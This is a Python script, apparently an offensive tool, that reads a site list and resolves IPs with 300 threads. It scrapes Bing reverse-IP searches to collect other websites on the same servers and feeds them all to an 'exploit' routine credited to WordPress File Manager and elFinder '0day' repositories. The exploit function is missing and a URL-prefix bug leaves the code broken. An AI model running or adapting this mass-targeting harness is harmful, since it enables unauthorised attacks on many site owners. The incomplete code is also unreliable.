#!/usr/bin/env python
# from https://github.com/w4fz5uck5/wp-file-manager-0day
# from https://github.com/0xtn/0day-elFinder-2020
import requests
import os
import sys
import concurrent.futures
import threading
import socket
import re
from sys import platform

if not os.path.exists('vk'):
  os.makedirs('vk')
if platform == "linux" or platform == "linux2":
 os.system('clear')
elif platform == "win32":
 os.system('cls')
t = []

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}

def fassa5(i):
 if not 'http://' in i and not 'https://' in i:
	 i = i + 'http://'
 exploit(i)
def sitfn(ip):
 try :
  ip = ip.replace('\n', '').replace('\r', '')
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(5)
  result = sock.connect_ex((ip, 80))
  if str(result) == '0':
   print("\033[92m[+] Live IP: "+ip)
   open("vk/LiveIps.txt", "a").write(ip + "\n")
   bo = []
   lonk = 1
   while lonk < 299:
    bingung = "http://www.bing.com/search?q=IP%3A"+ip+"+&count=50&first="+str(lonk)
    iyagw = requests.get(bingung,verify=False,headers=headers)
    gans = iyagw.content
    ya = re.findall('<h2><a href="(.*?)"', gans.decode('utf-8'))
    for z in ya:
     o = z.split('/')
     if (o[0]+'//'+o[2]) in bo:
      pass
     else:
      bo.append(o[0]+'//'+o[2])
      print("\033[92m[+] ",(o[0]+'//'+o[2]))
      with open('vk/GrabedSites.txt','a+') as s:
       s.writelines((o[0]+'//'+o[2])+'\n')
    lonk = lonk+50
  else:
   print("\033[91m[-] "+ip+" ==> Die IP")
   open("vk/DieIps.txt", "a").write(ip + "\n")
 except:
  print("\033[91m[-] "+ip+" ==> Passed IP")
  open("vk/passedIps.txt", "a").write(ip + "\n")
def ipfin(i):
 if 'http://' in i :
  url=i.replace('http://','')
 if 'https://' in i:
  url=i.replace('https://','')
 if '/' in url:
  url=url.replace('/','')
 try:
  hell=socket.gethostbyname(url)
  print("\033[92m[+] IP: ",hell)
  open('vk/SitesIPs.txt', 'a+').write(hell + "\n")
  sitfn(hell)
 except:
  print("\033[91m[-] "+i+" ==> Can't Get IP")

#sites = open(input('Sites\033[94m:\033[92m '), 'r').read().splitlines()
sites = open(sys.argv[1], 'r').read().splitlines()
					     
option= 1
if option==2:
 try:
  with concurrent.futures.ThreadPoolExecutor(300) as executor:
   executor.map(fassa5, sites)
 except Exception as e:
  print(e)
elif option==1:
 try:
  with concurrent.futures.ThreadPoolExecutor(300) as executor:
   executor.map(ipfin, sites)
 except Exception as e:
  print(e)
 amir=open('vk/GrabedSites.txt','r').read().splitlines()
 try:
  with concurrent.futures.ThreadPoolExecutor(300) as executor:
   executor.map(fassa5, amir)
 except Exception as e:
  print(e)



